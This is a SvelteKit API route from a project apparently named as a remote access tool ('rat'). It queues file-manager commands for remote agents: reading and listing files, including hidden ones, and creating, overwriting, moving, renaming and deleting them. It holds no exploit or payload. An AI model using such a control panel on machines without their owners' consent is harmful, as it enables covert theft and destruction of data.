import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { fileManagerStore, FileManagerError } from '$lib/server/rat/file-manager';
import { registry, RegistryError } from '$lib/server/rat/store';
import type { FileManagerCommandPayload, FileOperationResponse } from '$lib/types/file-manager';

const ACCEPTED_STATUS = 202;

function requireString(value: unknown, message: string): string {
	if (typeof value !== 'string' || value.trim().length === 0) {
		throw error(400, message);
	}
	return value.trim();
}

function optionalString(value: unknown): string | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const trimmed = value.trim();
	return trimmed.length > 0 ? trimmed : undefined;
}

function requireEncoding(value: unknown): 'utf-8' | 'base64' | undefined {
	if (value === undefined) {
		return undefined;
	}
	if (value === 'utf-8' || value === 'base64') {
		return value;
	}
	throw error(400, 'Unsupported file encoding');
}

function queueFileManagerCommand(agentId: string, payload: FileManagerCommandPayload): void {
	try {
		registry.queueCommand(agentId, { name: 'file-manager', payload });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue file manager command');
	}
}

function accepted(message: string, extra: Partial<FileOperationResponse> = {}) {
	return json({ success: true, message, ...extra } satisfies FileOperationResponse, {
		status: ACCEPTED_STATUS
	});
}

export const GET: RequestHandler = ({ params, url }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const pathParam = url.searchParams.get('path');
	const typeParam = url.searchParams.get('type');
	const refreshRequested = url.searchParams.get('refresh') === 'true';
	const includeHiddenParam = url.searchParams.get('includeHidden');
	const includeHidden = includeHiddenParam === null ? undefined : includeHiddenParam === 'true';

	try {
		const resource = fileManagerStore.getResource(id, pathParam);
		return json(resource);
	} catch (err) {
		if (err instanceof FileManagerError) {
			if (err.status === 404 && refreshRequested && typeParam) {
				const type = typeParam === 'file' ? 'file' : 'directory';
				if (type === 'file') {
					const path = requireString(pathParam, 'File path is required to load file content');
					queueFileManagerCommand(id, { action: 'read-file', path });
				} else {
					const payload: FileManagerCommandPayload = {
						action: 'list-directory',
						path: pathParam?.trim() ? pathParam.trim() : undefined,
						includeHidden
					};
					queueFileManagerCommand(id, payload);
				}
				return json(
					{
						queued: true,
						message:
							typeParam === 'file'
								? 'Waiting for the agent to provide the file contents…'
								: 'Waiting for the agent to provide the directory listing…'
					},
					{ status: ACCEPTED_STATUS }
				);
			}
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to load file manager resource');
	}
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: Record<string, unknown>;
	try {
		payload = (await request.json()) as Record<string, unknown>;
	} catch (err) {
		throw error(400, 'Invalid file manager payload');
	}

	if (!payload || typeof payload !== 'object') {
		throw error(400, 'File manager payload must be an object');
	}

	const action = typeof payload.action === 'string' ? payload.action : undefined;

	switch (action) {
		case 'create-file':
		case 'create-directory': {
			const directory = requireString(payload.directory, 'Target directory is required');
			const name = requireString(payload.name, 'Entry name is required');
			if (
				action === 'create-file' &&
				payload.content !== undefined &&
				typeof payload.content !== 'string'
			) {
				throw error(400, 'Initial file content must be a string');
			}
			const content =
				action === 'create-file'
					? typeof payload.content === 'string'
						? payload.content
						: ''
					: undefined;

			queueFileManagerCommand(id, {
				action: 'create-entry',
				directory,
				name,
				entryType: action === 'create-file' ? 'file' : 'directory',
				content
			});

			return accepted(
				action === 'create-file'
					? 'Create file request queued for agent.'
					: 'Create folder request queued for agent.',
				{ path: directory }
			);
		}
		default:
			throw error(400, 'Unsupported file manager action');
	}
};

export const PATCH: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: Record<string, unknown>;
	try {
		payload = (await request.json()) as Record<string, unknown>;
	} catch (err) {
		throw error(400, 'Invalid file manager payload');
	}

	if (!payload || typeof payload !== 'object') {
		throw error(400, 'File manager payload must be an object');
	}

	const action = typeof payload.action === 'string' ? payload.action : undefined;

	switch (action) {
		case 'rename-entry': {
			const path = requireString(payload.path, 'Entry path is required');
			const name = requireString(payload.name, 'New entry name is required');

			queueFileManagerCommand(id, { action: 'rename-entry', path, name });

			return accepted('Rename request queued for agent.', { path });
		}
		case 'move-entry': {
			const path = requireString(payload.path, 'Entry path is required');
			const destination = requireString(payload.destination, 'Destination directory is required');
			const name = optionalString(payload.name);

			queueFileManagerCommand(id, {
				action: 'move-entry',
				path,
				destination,
				name
			});

			return accepted('Move request queued for agent.', { path: destination });
		}
		case 'update-file': {
			const path = requireString(payload.path, 'File path is required');
			if (typeof payload.content !== 'string') {
				throw error(400, 'Updated file content must be provided as a string');
			}
			const encoding = requireEncoding(payload.encoding);

			queueFileManagerCommand(id, {
				action: 'update-file',
				path,
				content: payload.content,
				encoding
			});

			return accepted('File update queued for agent.', { path });
		}
		default:
			throw error(400, 'Unsupported file manager action');
	}
};

export const DELETE: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: Record<string, unknown>;
	try {
		payload = (await request.json()) as Record<string, unknown>;
	} catch (err) {
		throw error(400, 'Invalid file manager payload');
	}

	if (!payload || typeof payload !== 'object') {
		throw error(400, 'File manager payload must be an object');
	}

	const path = requireString(payload.path, 'Entry path is required');

	queueFileManagerCommand(id, { action: 'delete-entry', path });

	return accepted('Delete request queued for agent.', { path });
};
